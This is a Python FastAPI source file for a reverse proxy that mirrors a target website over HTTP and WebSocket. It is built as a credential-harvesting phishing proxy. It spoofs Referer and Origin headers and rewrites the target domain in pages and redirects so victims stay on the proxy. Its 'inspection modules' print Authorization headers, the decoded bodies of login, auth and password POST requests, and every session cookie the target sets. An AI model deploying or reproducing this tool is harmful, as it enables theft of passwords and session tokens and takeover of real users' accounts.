import re
import asyncio
import httpx
import websockets
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse
from urllib.parse import urljoin, urlparse

app = FastAPI()

# Increased timeout slightly to give large JS chunks a better chance to complete
client = httpx.AsyncClient(follow_redirects=False, timeout=60.0)
TARGET_BASE = "https://example.com"
parsed_target = urlparse(TARGET_BASE)
TARGET_DOMAIN = parsed_target.netloc

HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate", 
    "proxy-authorization", "te", "trailers", 
    "transfer-encoding", "upgrade", "host", "content-length",
    "content-encoding", 
    "accept-encoding"
}

COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
# Keywords to trigger POST body inspection
AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]

# =========================================================
# [WEBSOCKET PROXY MODULE]
# =========================================================
@app.websocket("/{path:path}")
async def websocket_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    
    # Safely convert http:// to ws:// and https:// to wss://
    ws_base = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_ws_url = urljoin(ws_base.rstrip("/") + "/", path)
    
    query_string = websocket.url.query
    if query_string:
        target_ws_url += f"?{query_string}"

    print(f"\n[WS] Intercepted WebSocket Upgrade -> Forwarding to: {target_ws_url}")

    try:
        # Connect to the upstream WebSocket server
        async with websockets.connect(target_ws_url) as target_ws:
            
            # Task to forward messages from Client to Upstream Server
            async def forward_to_target():
                try:
                    while True:
                        data = await websocket.receive_text()
                        await target_ws.send(data)
                except WebSocketDisconnect:
                    pass

            # Task to forward messages from Upstream Server back to Client
            async def forward_to_client():
                try:
                    while True:
                        data = await target_ws.recv()
                        await websocket.send_text(data)
                except websockets.exceptions.ConnectionClosed:
                    pass

            # Run both forwarding tasks concurrently
            await asyncio.gather(forward_to_target(), forward_to_client())
            
    except Exception as e:
        print(f"[WS] Connection Error: {e}")
    finally:
        try:
            await websocket.close()
        except:
            pass
# =========================================================

# =========================================================
# [HTTP PROXY MODULE]
# =========================================================
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
async def proxy(request: Request, path: str):
    # 1. Build the target URL with Query Params preserved
    query_string = request.url.query
    target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query_string:
        target_url += f"?{query_string}"
    
    proxy_base = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc
    
    # ---------------------------------------------------------
    # [INSPECTION MODULE: Incoming Authorization]
    # ---------------------------------------------------------
    auth_header = request.headers.get("authorization")
    if auth_header:
        print(f"\n[KEY] Authorization Header Found | Method: {request.method} | Path: /{path}")
        print(f"      Value: {auth_header}")
    # ---------------------------------------------------------
    
    # 2. Forward Headers & Spoof Identity
    req_headers = []
    for k, v in request.headers.items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue
        
        # SPOOF: Tell the target the request came from their own domain
        if k_lower == "referer":
            v = v.replace(proxy_domain, TARGET_DOMAIN)
        if k_lower == "origin":
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            
        req_headers.append((k, v))
    
    # Force the host header to the target
    req_headers.append(("host", TARGET_DOMAIN))
    req_headers.append(("accept-encoding", "identity"))
            
    body = await request.body()

    # ---------------------------------------------------------
    # [INSPECTION MODULE: Authentication POST Bodies]
    # ---------------------------------------------------------
    if request.method == "POST":
        path_lower = path.lower()
        if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
            print(f"\n[!] Auth POST Intercepted | Path: /{path}")
            try:
                # Decode the raw bytes into a readable string (e.g., form data or JSON)
                decoded_body = body.decode('utf-8', errors='replace')
                print(f"    Payload: {decoded_body}")
            except Exception as e:
                print(f"    Payload (Raw): {repr(body)}")
    # ---------------------------------------------------------
    
    # 3. Request
    try:
        proxy_req = client.build_request(
            method=request.method,
            url=target_url,
            headers=req_headers,
            content=body
        )
        resp = await client.send(proxy_req, stream=True)
    except httpx.RequestError as exc:
        raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")

    # 4. Outgoing Headers
    processed_headers = []
    for k, v in resp.headers.multi_items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue
            
        if k_lower == "location":
            v = v.replace(TARGET_DOMAIN, proxy_domain)
            v = v.replace("https://", "http://") # For local testing
            processed_headers.append((k, v))
            
        elif k_lower == "set-cookie":
            # ---------------------------------------------------------
            # [INSPECTION MODULE: Outgoing Session Cookies]
            # ---------------------------------------------------------
            print(f"\n[*] Set-Cookie Intercepted | Path: /{path}")
            print(f"    Cookie: {v}")
            # ---------------------------------------------------------
            v = COOKIE_DOMAIN_RE.sub("", v)
            processed_headers.append((k, v))
        else:
            processed_headers.append((k, v))

    # 5. Body Fork (With Graceful ReadError Handling)
    content_type = resp.headers.get("content-type", "").lower()
    
    if any(t in content_type for t in ["text/html", "javascript", "json"]):
        try:
            # Wrap the read in a try block to catch ReadErrors on large/stalled files
            raw_bytes = await resp.aread()
        except httpx.ReadError as exc:
            print(f"[!] ReadError while buffering {path}: {exc}")
            await resp.aclose()
            raise HTTPException(status_code=502, detail="Upstream server dropped the connection mid-stream.")
            
        text = raw_bytes.decode("utf-8", errors="ignore") 
        
        # Swap raw domain strings to catch subdomains and JS links
        rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
        rewritten = rewritten.replace("https://" + proxy_domain, "http://" + proxy_domain)

        final_response = Response(content=rewritten.encode("utf-8"), status_code=resp.status_code)
        await resp.aclose()
    else:
        # Safe stream generator for binary assets to prevent crashes mid-download
        async def safe_stream_generator():
            try:
                async for chunk in resp.aiter_bytes():
                    yield chunk
            except httpx.ReadError as exc:
                print(f"[!] Streaming ReadError on {path}: {exc}")
            finally:
                await resp.aclose()

        final_response = StreamingResponse(
            safe_stream_generator(),
            status_code=resp.status_code
        )

    # 6. Cleanup & Header Attachment
    # Safely check if the header exists before deleting it
    if "content-length" in final_response.headers:
        del final_response.headers["content-length"]
    
    for k, v in processed_headers:
        final_response.headers.append(k, v)
            
    return final_response